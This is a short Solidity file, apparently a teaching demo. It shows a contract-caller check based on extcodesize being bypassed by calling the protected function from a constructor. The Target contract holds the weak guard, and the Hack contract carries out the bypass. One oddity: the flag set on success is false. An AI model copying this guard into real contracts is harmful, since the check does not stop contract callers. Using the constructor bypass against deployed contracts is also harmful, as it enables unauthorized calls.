pragma solidity ^0.8.0;

contract Target {

    function isContract(address account) public view returns (bool) {
        uint size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    bool public pwned = false;
    function protected() external {
        require(!isContract(msg.sender), "no contract allowed");
        pwned = false;
    }
}

contract FailedAttack {

    function pwn(address _target) external {
        Target(_target).protected();
    }
}

contract Hack {

    bool public isContract;
    address public addr;

    constructor(address _target) {
        isContract = Target(_target).isContract(address(this));
        addr = address(this);
        Target(_target).protected();
    }
}
